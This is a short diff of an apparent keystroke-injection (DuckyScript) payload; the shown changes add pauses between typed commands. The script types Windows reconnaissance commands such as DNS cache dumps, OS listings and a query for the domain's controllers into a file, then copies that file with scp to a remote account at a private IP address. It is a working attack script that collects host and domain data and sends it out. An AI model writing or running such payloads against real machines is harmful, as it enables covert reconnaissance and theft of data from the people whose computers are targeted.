@@ -30,6 +30,7 @@ STRING echo ##ipconfig /displaydns >> sys
 ENTER
 STRING ipconfig /displaydns >> sys
 ENTER
+DELAY 5000
 STRING echo ##wmic os list brief >> sys
 ENTER
 STRING wmic os list brief >> sys
@@ -62,6 +63,7 @@ STRING echo ##net group "Domain Controllers" /domain >> sys
 ENTER
 STRING net group "Domain Controllers" /domain >> sys
 ENTER
+DELAY 5000
 STRING scp sys omg@192.168.200.224:~/
 ENTER
 DELAY 2000
